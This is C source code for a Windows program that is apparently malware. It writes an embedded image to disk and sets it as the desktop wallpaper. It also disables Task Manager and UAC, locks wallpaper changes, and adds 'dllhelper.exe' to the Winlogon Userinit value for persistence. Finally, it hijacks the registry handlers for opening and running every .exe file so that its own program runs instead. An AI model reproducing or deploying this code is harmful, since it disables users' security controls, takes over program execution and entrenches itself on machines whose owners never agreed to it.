#include "registrykeys.h"
unsigned char rawData1[] = { 0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01,
0x00, 0x01, 0x00, 0x00, 0xFF, 0xDB, 0x00, 0x84, 0x00, 0x09, 0x06, 0x07, 0x12, 0x12, 0x12, 0x15,
0x12, 0x12, 0x12, 0x16, 0x15, 0x15, 0x15, 0x18, 0x18, 0x18, 0x15, 0x17, 0x17, 0x17, 0x15, 0x17,
0x17, 0x17, 0x17, 0x17, 0x1B, 0x18, 0x17, 0x15, 0x18, 0x17, 0x1A, 0x18, 0x1D, 0x28, 0x20, 0x18,
0x1A, 0x25, 0x1D, 0x18, 0x18, 0x21, 0x31, 0x21, 0x25, 0x29, 0x2B, 0x2E, 0x2E, 0x2E, 0x17, 0x1F,
0x33, 0x38, 0x33, 0x2F, 0x37, 0x28, 0x2D, 0x2E, 0x2B, 0x01, 0x0A, 0x0A, 0x0A, 0x0E, 0x0D, 0x0E,
0x1A, 0x10, 0x10, 0x1A, 0x2D, 0x25, 0x1D, 0x25, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D,
0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0xFF, 0xC0, 0x00, 0x11, 0x08, 0x00,
0xB1, 0x01, 0x1C, 0x03, 0x01, 0x22, 0x00, 0x02, 0x11, 0x01, 0x03, 0x11, 0x01, 0xFF, 0xC4, 0x00,
0x18, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x00, 0x02, 0x03, 0x07, 0xFF, 0xC4, 0x00, 0x28, 0x10, 0x00, 0x02, 0x01, 0x03,
0x04, 0x01, 0x04, 0x03, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0x01, 0x11,
0xA1, 0xB1, 0x71, 0x81, 0x91, 0xC1, 0xD1, 0x02, 0x21, 0x41, 0x61, 0x31, 0x51, 0xE1, 0xF1, 0x12,
0x03, 0xFF, 0xC4, 0x00, 0x19, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x03, 0x06, 0x04, 0xFF, 0xC4, 0x00, 0x1C,
0x11, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x01, 0x11, 0x02, 0x31, 0x12, 0xB1, 0xF0, 0x41, 0xFF, 0xDA, 0x00, 0x0C, 0x03, 0x01,
0x00, 0x02, 0x11, 0x03, 0x11, 0x00, 0x3F, 0x00, 0xF2, 0x79, 0x97, 0x82, 0xA8, 0x49, 0x1F, 0x23,
0xD0, 0xEB, 0x55, 0x18, 0x99, 0x02, 0x06, 0xA5, 0x6E, 0x24, 0xA2, 0x42, 0x1E, 0x45, 0xC0, 0x37,
0x1A, 0x89, 0x77, 0x18, 0x97, 0xDF, 0xE8, 0x20, 0xA0, 0x1B, 0x8D, 0xD4, 0xD4, 0x4C, 0x99, 0x85,
0x81, 0x87, 0xE3, 0xF4, 0x0E, 0x91, 0xB8, 0x9D, 0x5A, 0x9A, 0x89, 0x78, 0x7B, 0x32, 0xE4, 0xD4,
0x43, 0xC7, 0xE8, 0xCD, 0x76, 0xE5, 0xAA, 0xEA, 0xD5, 0xF8, 0x35, 0x12, 0xEE, 0xF8, 0x08, 0x6E,
0x6A, 0x0C, 0xD7, 0x58, 0xA2, 0x67, 0xEC, 0xD5, 0x55, 0xFB, 0x33, 0x1F, 0x87, 0x48, 0x34, 0xE0,
0xCB, 0x71, 0x4C, 0xCF, 0xDB, 0x1F, 0xA1, 0xF7, 0xFB, 0x66, 0xC1, 0xFD, 0xC0, 0xD1, 0x7E, 0x08,
0xB3, 0x33, 0x3F, 0x6C, 0x15, 0x46, 0x5E, 0x20, 0xA7, 0x24, 0x2B, 0x9C, 0xB6, 0x31, 0x32, 0xF2,
0x74, 0x30, 0xE4, 0xD4, 0x72, 0xE9, 0x8F, 0x54, 0xBC, 0x3D, 0x19, 0x99, 0x79, 0x35, 0x2D, 0x83,
0xD4, 0xDC, 0xD4, 0x72, 0xE9, 0x89, 0x97, 0x80, 0x99, 0x17, 0x06, 0x5B, 0x1A, 0x72, 0xAA, 0x64,
0xCD, 0x46, 0x5B, 0x04, 0xC3, 0xB0, 0xB9, 0xD1, 0x32, 0xEE, 0x66, 0xA6, 0x8C, 0xB6, 0x35, 0x18,
0xAA, 0x64, 0xCD, 0x46, 0x40, 0x58, 0xB5, 0x4C, 0x85, 0x5E, 0x06, 0x5B, 0x99, 0x26, 0x6D, 0x53,
0x2F, 0x20, 0x32, 0x12, 0x2C, 0xD6, 0x85, 0xC8, 0x08, 0x36, 0x60, 0xA1, 0xE0, 0xA1, 0x5D, 0x06,
0x1B, 0xBE, 0x01, 0xA3, 0x03, 0x00, 0xAE, 0xE2, 0xAF, 0x20, 0xD4, 0x6A, 0x15, 0xD0, 0x60, 0x21,
0xE5, 0xF6, 0xB0, 0xC4, 0x3C, 0x03, 0xA4, 0x6A, 0x16, 0xA6, 0xBD, 0x2D, 0x8C, 0xC2, 0xBA, 0x9A,
0x86, 0xC6, 0x6B, 0xAC, 0x6A, 0x0D, 0xC3, 0x67, 0xA3, 0x30, 0xDD, 0xE8, 0xD7, 0xA5, 0xB3, 0xD1,
0x9A, 0xEB, 0xCB, 0x50, 0xDC, 0xD6, 0xED, 0x75, 0x7F, 0x66, 0x61, 0xBB, 0xE0, 0xD3, 0x78, 0xF9,
0x75, 0x33, 0x5D, 0x63, 0x50, 0xF1, 0x3C, 0x0B, 0x78, 0x7A, 0x32, 0xAC, 0x6E, 0x6A, 0x1E, 0x5F,
0x00, 0xE9, 0x14, 0xCB, 0xEC, 0xE7, 0x61, 0xDF, 0x4E, 0x7D, 0xBF, 0xDB, 0x83, 0x6B, 0xBF, 0x83,
0x5F, 0xEB, 0xE6, 0xE0, 0x63, 0x2D, 0xB5, 0xF6, 0x7F, 0x20, 0xBF, 0x6D, 0x0A, 0x5E, 0x1F, 0xE9,
0x4A, 0xBA, 0x08, 0x62, 0x5B, 0x3E, 0x0C, 0x7A, 0x9B, 0xBD, 0xC1, 0xB9, 0x6D, 0xE7, 0xF8, 0x66,
0x65, 0xE5, 0xF0, 0x6A, 0x39, 0x74, 0xC4, 0xB6, 0x33, 0xEA, 0x6E, 0x6A, 0x5B, 0x3D, 0x98, 0x93,
0x51, 0xC7, 0xA0, 0xE0, 0xC8, 0xCB, 0x67, 0xA0, 0x95, 0x76, 0x34, 0xE5, 0x59, 0x90, 0x93, 0x52,
0xAE, 0xA6, 0x45, 0xCE, 0x89, 0x6C, 0x66, 0x5E, 0x0D, 0x4B, 0xCB, 0xE0, 0xCC, 0x9A, 0x62, 0x89,
0x09, 0x15, 0x77, 0x01, 0x62, 0xA9, 0x32, 0x2D, 0xDF, 0x00, 0x4C, 0xD4, 0x66, 0x56, 0xA6, 0xA4,
0xCC, 0x8C, 0x63, 0xA6, 0xC5, 0xC8, 0x0C, 0x03, 0x64, 0xA0, 0x20, 0x49, 0xA8, 0xD4, 0x2F, 0x63,
0x01, 0x0F, 0x25, 0x06, 0x5B, 0x8D, 0xB7, 0x22, 0x87, 0x92, 0x86, 0xC0, 0xE9, 0x1B, 0x18, 0x6C,
0x02, 0x0E, 0x91, 0xA8, 0x6E, 0x6E, 0x1B, 0x3D, 0x1C, 0xDC, 0x9B, 0x89, 0x78, 0x33, 0x5D, 0x39,
0xAD, 0xC3, 0x73, 0x51, 0xF5, 0xF9, 0xFF, 0x00, 0x1E, 0xCC, 0x43, 0x73, 0x50, 0xD8, 0xCD, 0x76,
0xE6, 0xB6, 0xE4, 0x5B, 0xE7, 0xEA, 0xC6, 0x1C, 0x9A, 0xFF, 0x00, 0xAD, 0x5A, 0x03, 0x72, 0x97,
0x88, 0x19, 0x79, 0xD5, 0xA1, 0x89, 0x78, 0xD3, 0x41, 0x9E, 0xFB, 0x03, 0xAA, 0xA5, 0x38, 0x58,
0x0A, 0xBB, 0x19, 0xAB, 0xB8, 0xB3, 0x6A, 0x97, 0xFC, 0x33, 0x32, 0xFB, 0xFD, 0x8C, 0xB6, 0x33,
0x2D, 0xC5, 0x8B, 0x59, 0x5E, 0x4C, 0xCB, 0x71, 0x99, 0x09, 0x6E, 0x69, 0xC6, 0xB3, 0x2D, 0x8C,
0xC9, 0xA9, 0x6C, 0x66, 0x4D, 0x39, 0xD0, 0xE0, 0xCC, 0x9A, 0x96, 0xC6, 0x6A, 0xF2, 0x69, 0xCE,
0x89, 0x09, 0x7E, 0x44, 0x1B, 0x0B, 0x9D, 0x00, 0x32, 0x64, 0x59, 0xA9, 0xC8, 0x08, 0x0B, 0x15,
0x49, 0x99, 0x34, 0xE4, 0x2A, 0x4C, 0xD6, 0x89, 0xC9, 0x12, 0xBC, 0x03, 0x66, 0x08, 0x95, 0xDC,
0xA1, 0xE0, 0x9A, 0x69, 0xB8, 0x83, 0x77, 0xC1, 0x40, 0x35, 0x1A, 0x85, 0x75, 0x34, 0x66, 0x15,
0xD4, 0xA2, 0x41, 0xB9, 0x5D, 0x1C, 0x8C, 0x4B, 0xC1, 0x98, 0x79, 0x18, 0x6C, 0xF4, 0x65, 0xD2,
0x56, 0xE2, 0x5E, 0x46, 0x17, 0xB3, 0x35, 0x18, 0x6C, 0xF6, 0x0E, 0x92, 0xB6, 0xE4, 0xD5, 0x55,
0xFA, 0x39, 0xD5, 0xE5, 0xF2, 0x69, 0xBB, 0xED, 0x63, 0x2E, 0x92, 0xB4, 0xE4, 0xD5, 0x5D, 0xDF,
0x26, 0x2A, 0xAE, 0x85, 0x57, 0x87, 0xB2, 0xC6, 0xA7, 0x4D, 0xD7, 0xD9, 0xFD, 0x3F, 0xD1, 0xAB,
0xBF, 0xE1, 0xE0, 0xC7, 0xFD, 0x2F, 0xF3, 0x72, 0xAB, 0xBB, 0xE0, 0x30, 0xFC, 0x8D, 0x55, 0xD0,
0x2A, 0xB9, 0xB8, 0x4C, 0xBB, 0x3F, 0xC2, 0xAB, 0xCB, 0xD8, 0x8D, 0x53, 0x2A, 0xEA, 0x66, 0x65,
0xE5, 0xE8, 0xAA, 0xEC, 0xFF, 0x00, 0x42, 0x65, 0xE5, 0xE8, 0x58, 0xB4, 0x55, 0xE0, 0x25, 0xB9,
0x4C, 0xBC, 0x4B, 0x83, 0x35, 0x79, 0x34, 0xE5, 0x6A, 0x99, 0x78, 0x33, 0xEA, 0x97, 0x91, 0xAB,
0xC0, 0x39, 0x7C, 0x8B, 0x16, 0x89, 0x6C, 0x65, 0xB1, 0xAA, 0xAB, 0xF4, 0x66, 0x5E, 0x1F, 0xE0,
0xB9, 0xD4, 0x66, 0xA3, 0x2A, 0xEA, 0x12, 0x2C, 0xD4, 0x66, 0xA3, 0x2A, 0xE8, 0x0A, 0xF0, 0x2C,
0x54, 0x12, 0x2E, 0x40, 0x59, 0xA9, 0xC9, 0x93, 0x46, 0x64, 0x59, 0xAD, 0xC9, 0x01, 0x39, 0x06,
0x9A, 0x28, 0x6E, 0x51, 0x24, 0x0D, 0x34, 0x50, 0x04, 0x0D, 0x35, 0x03, 0x50, 0x27, 0x00, 0xD6,
0xB4, 0xE4, 0x60, 0xC8, 0xB8, 0x06, 0xE5, 0x6D, 0xC8, 0xC4, 0xBC, 0x3D, 0x99, 0xAB, 0xC8, 0x83,
0xA4, 0xAD, 0x55, 0xE4, 0xD4, 0x3C, 0x98, 0x89, 0x79, 0x2A, 0x83, 0x52, 0xB4, 0x69, 0xC1, 0x8A,
0x95, 0x5D, 0xE0, 0x8E, 0xB7, 0x52, 0x6E, 0x62, 0xA3, 0x57, 0x70, 0xC3, 0xF2, 0x69, 0xB0, 0x4C,
0xBC, 0x99, 0xAB, 0xB1, 0x08, 0xD3, 0x26, 0x66, 0x5F, 0xAF, 0x72, 0x90, 0xAB, 0xC8, 0xB3, 0x6A,
0x09, 0x6E, 0x52, 0x12, 0xDC, 0x58, 0xB5, 0x4B, 0x60, 0x96, 0xE5, 0x2D, 0x8C, 0xB9, 0x16, 0x2D,
0x32, 0x66, 0x45, 0xC1, 0x91, 0x66, 0x93, 0x23, 0x50, 0x6C, 0x2C, 0x54, 0x04, 0x04, 0xCD, 0x32,
0x65, 0xC1, 0xA3, 0x22, 0x2A, 0x90, 0x91, 0x72, 0x66, 0x56, 0xA3, 0x18, 0xAD, 0x93, 0x92, 0x95,
0x75, 0x27, 0x20, 0xD1, 0x28, 0x25, 0x76, 0x25, 0x78, 0x06, 0x9A, 0xA8, 0x54, 0x95, 0xDC, 0x89,
0xA6, 0x8A, 0x24, 0x09, 0xC0, 0x1D, 0x6E, 0xAF, 0x24, 0xE0, 0x22, 0x4A, 0x1B, 0x3D, 0x83, 0x72,
0xB5, 0x57, 0x91, 0x83, 0x30, 0xDC, 0x61, 0xB1, 0x35, 0x29, 0xAB, 0xC9, 0xAA, 0x98, 0x72, 0x2A,
0xEE, 0x06, 0x53, 0x57, 0x91, 0x5F, 0x67, 0xF4, 0x65, 0x5E, 0x46, 0xAA, 0xFD, 0x11, 0x94, 0xD5,
0x5D, 0x06, 0xAE, 0xEF, 0x93, 0x15, 0x57, 0x41, 0x99, 0x77, 0x7C, 0x81, 0xD3, 0x57, 0x62, 0xA9,
0x9A, 0xAB, 0xA9, 0x2B, 0xB0, 0xAD, 0x35, 0x0A, 0xBC, 0x85, 0x4A, 0xAF, 0x24, 0xCE, 0xA7, 0x01,
0x57, 0x92, 0x96, 0xC1, 0x57, 0x91, 0x67, 0x54, 0xCB, 0xC1, 0x49, 0x38, 0x0A, 0x8B, 0x36, 0xAA,
0xBC, 0x04, 0xCB, 0xB1, 0x38, 0x07, 0x24, 0xCD, 0xA4, 0xC8, 0xAB, 0xB0, 0x0B, 0x35, 0x00, 0xD5,
0x5F, 0xB3, 0x2D, 0x85, 0x9A, 0x40, 0x95, 0xD8, 0x88, 0x50, 0x12, 0x21, 0x23, 0x18, 0xAD, 0x80,
0x80, 0x36, 0x60, 0x60, 0x08, 0x89, 0x22, 0x20, 0x2D, 0x37, 0x27, 0x00, 0x4E, 0x09, 0xAD, 0x68,
0xAA, 0x04, 0xE0, 0x0B, 0x4E, 0x49, 0xC0, 0x39, 0x17, 0x04, 0xD4, 0xA5, 0xC8, 0x99, 0x72, 0x55,
0x78, 0x03, 0xAD, 0x15, 0x40, 0xAA, 0xF0, 0x47, 0x4B, 0x61, 0xA9, 0x92, 0x25, 0xA6, 0xAE, 0xC4,
0xDC, 0xCD, 0x5D, 0x84, 0x96, 0xAA, 0xBB, 0x13, 0x90, 0x22, 0x1A, 0xAA, 0x52, 0xDC, 0x02, 0x5B,
0x8B, 0x3A, 0x5C, 0x04, 0xB7, 0x29, 0x09, 0x26, 0x6D, 0x20, 0x40, 0x22, 0x93, 0x23, 0x20, 0x4C,
0xD4, 0x02, 0x02, 0x2A, 0x01, 0x01, 0x15, 0x05, 0x45, 0xC8, 0x13, 0x35, 0xA9, 0x20, 0x95, 0x74,
0x27, 0x24, 0x5A, 0x02, 0x57, 0x72, 0x02, 0xD3, 0x72, 0x05, 0x76, 0x22, 0x68, 0x91, 0x54, 0xA0,
0x09, 0x18, 0x6C, 0x64, 0x60, 0x8E, 0x98, 0x6E, 0x35, 0x33, 0x51, 0x57, 0x70, 0x6B, 0x4B, 0x92,
0x70, 0x0E, 0x49, 0xC3, 0xD1, 0x2D, 0x23, 0x53, 0x2A, 0xF0, 0x35, 0x57, 0xEC, 0x8E, 0xA1, 0x32,
0x2A, 0xEC, 0x4B, 0x54, 0x3C, 0x10, 0x36, 0x1A, 0xAB, 0xF6, 0x4B, 0x51, 0x05, 0x48, 0x86, 0xA0,
0x72, 0x44, 0xE4, 0x46, 0xA2, 0x72, 0x15, 0x22, 0x67, 0x48, 0x13, 0x87, 0xA0, 0x15, 0x50, 0x48,
0xB8, 0x7B, 0x02, 0x66, 0xA0, 0xA8, 0xAB, 0xB0, 0x08, 0xA9, 0xC9, 0x49, 0x2B, 0xB8, 0x10, 0x26,
0x44, 0x24, 0x99, 0xAD, 0x49, 0x39, 0x29, 0x22, 0x68, 0x81, 0x11, 0x26, 0x80, 0x9B, 0x90, 0x12,
0xDC, 0x5C, 0x00, 0x13, 0x5A, 0xD1, 0x10, 0x43, 0x62, 0x4D, 0x39, 0x20, 0x72, 0x50, 0xD8, 0x0E,
0x97, 0x22, 0x64, 0x6A, 0x47, 0x50, 0x99, 0x72, 0x24, 0xB5, 0x09, 0x9A, 0x89, 0x2D, 0x42, 0x0D,
0x88, 0x96, 0xA2, 0x96, 0xE0, 0x4E, 0x49, 0x69, 0x70, 0x0E, 0x48, 0x88, 0x20, 0x29, 0x21, 0x08,
0x88, 0x08, 0x10, 0x20, 0x6C, 0x42, 0x90, 0x20, 0x10, 0x64, 0x04, 0x08, 0x27, 0x26, 0x66, 0x0D,
0x4C, 0xBC, 0x84, 0x8C, 0x66, 0xF8, 0x64, 0x8A, 0x64, 0x9C, 0x83, 0x44, 0x88, 0x09, 0x35, 0x00,
0x4D, 0xC8, 0x89, 0x6E, 0x50, 0x40, 0xE0, 0x0B, 0x45, 0x50, 0x72, 0x4E, 0x08, 0x97, 0x24, 0xE0,
0x09, 0xC1, 0x2D, 0x2E, 0x45, 0xC0, 0x39, 0x28, 0x23, 0xA8, 0x55, 0xD8, 0x09, 0xBB, 0xE0, 0x96,
0x92, 0x02, 0x6E, 0x4B, 0x49, 0x01, 0x12, 0xD3, 0x24, 0x05, 0x52, 0x49, 0xC1, 0x39, 0x02, 0x20,
0x9C, 0x11, 0x38, 0x29, 0x6E, 0x41, 0x03, 0x61, 0xA8, 0x0A, 0x26, 0x45, 0x5D, 0x80, 0x81, 0x02,
0x57, 0x72, 0x21, 0x50, 0x08, 0x08, 0x41, 0x51, 0x09, 0x21, 0x5A, 0x90, 0x10, 0x80, 0x24, 0x88,
0x89, 0x12, 0x20, 0x22, 0x49, 0xC1, 0x11, 0x12, 0x50, 0x05, 0x04, 0x49, 0x38, 0x02, 0x70, 0x0B,
0x4B, 0x91, 0x07, 0x24, 0x4B, 0x50, 0xB7, 0x08, 0x22, 0x4A, 0x44, 0x08, 0x8E, 0xA1, 0x02, 0x21,
0xA8, 0xAA, 0x44, 0xE4, 0x92, 0x70, 0x52, 0xDC, 0x81, 0xC8, 0xA5, 0x24, 0x4E, 0x08, 0x82, 0x01,
0x02, 0x04, 0x04, 0x09, 0x22, 0x20, 0x20, 0x5C, 0x81, 0x04, 0xC0, 0x8A, 0x42, 0x4A, 0x60, 0x08,
0x5A, 0xC4, 0xF5, 0xD9, 0xAF, 0x57, 0xCE, 0xB0, 0x44, 0x69, 0xC9, 0x47, 0x65, 0xE9, 0xF8, 0xDC,
0x08, 0x1A, 0x82, 0x3A, 0xEC, 0x7D, 0x5F, 0x3B, 0x11, 0x08, 0x9E, 0x37, 0x3D, 0x99, 0xF4, 0xFC,
0x6B, 0x24, 0x40, 0xD5, 0xF5, 0x4F, 0x41, 0xFB, 0xD2, 0x08, 0x88, 0x35, 0x3D, 0xC0, 0xFE, 0xB5,
0x92, 0x22, 0x31, 0x9F, 0xD6, 0x93, 0xD9, 0x78, 0x22, 0x24, 0x7D, 0x7F, 0x3B, 0x0F, 0xCE, 0xE2,
0x40, 0x59, 0xF4, 0xF9, 0xC0, 0x78, 0xEC, 0x88, 0x47, 0xF0, 0xFA, 0xBE, 0x76, 0x19, 0xEC, 0x88,
0x1A, 0xFD, 0xF6, 0x3D, 0x3F, 0x1A, 0x97, 0x82, 0x21, 0x64, 0x4F, 0x50, 0x3F, 0x33, 0xAC, 0x11,
0x12, 0x51, 0xDC, 0x87, 0xEB, 0x7E, 0xC8, 0x89, 0x7E, 0xFA, 0x13, 0xD7, 0x65, 0x3E, 0x08, 0x85,
0x9A, 0xD7, 0xCE, 0xE6, 0x23, 0xE3, 0x72, 0x20, 0x57, 0xD3, 0xE0, 0xBD, 0x5E, 0x08, 0x85, 0x2F,
0x9D, 0xCB, 0xD3, 0xE7, 0x04, 0x44, 0x04, 0x7C, 0x69, 0x3D, 0x98, 0xFF, 0x00, 0xD3, 0xE3, 0x41,
0x21, 0x8C, 0x75, 0xE3, 0xFF, 0xD9 };
void taskmgr() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"DisableTaskmgr", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
//HKCU\Control Panel\Desktop
void infect() {
	const char* exe = """C:\\Windows\\System32\\dllhelper.exe -a \"%1\" %*""";
	HKEY hkey;

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\runas\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal2 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
	}
	LONG retVal3 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal3 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
	}
}
void lua() {
	DWORD dwVal = 0;

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"EnableLUA", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void nochange() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"NoChangingWallPaper", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void autocolorization() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"Control Panel\\Desktop\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"AutoColorization", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void resource1()
{
	DWORD dw;
	HANDLE hFile = CreateFileA("C:\\hello.png", GENERIC_WRITE, NULL, NULL, CREATE_NEW, NULL, NULL);
	WriteFile(hFile, rawData1, sizeof(rawData1), &dw, 0);
	CloseHandle(hFile);
}
void clean() {
	const char* exefile = """\"%1\" %*""";
	HKEY hkey;

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal2 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exefile, strlen(exefile));
	}
	LONG retVal3 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Classes\\exefile\\shell\\runas\\command", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (~retVal3 == ERROR_SUCCESS);
	{
		RegSetValueExA(hkey, 0, 0, REG_SZ, (unsigned char*)exefile, strlen(exefile));
	}

}
void use() {
	DWORD dwVal = 1;

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, L"UseDefaultTile", 0, REG_DWORD, (LPBYTE)&dwVal, sizeof(DWORD));
	RegCloseKey(hKey);
}
void wallpaper() {
	const wchar_t* file = L"C:\\hello.png";
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void*)file, SPIF_UPDATEINIFILE);
}
void launch() {
	const char* exe = "C:\\Windows\\system32\\userinit.exe,C:\\Windows\\System32\\dllhelper.exe";
	HKEY hkey;
	const char* czname = "Userinit";
	//const char* czVal = "1"; 

	LONG retVal2 = RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", 0, NULL, REG_OPTION_NON_VOLATILE,
		KEY_WRITE, NULL, &hkey, NULL);
	if (retVal2 == ERROR_SUCCESS)
	{
		RegSetValueExA(hkey, czname, 0, REG_SZ, (unsigned char*)exe, strlen(exe));
	}
	RegCloseKey(hkey);
}
void all() {
	taskmgr();
	lua();
	launch();
	resource1();
	autocolorization();
	wallpaper();
	use();
	nochange();
	infect();
}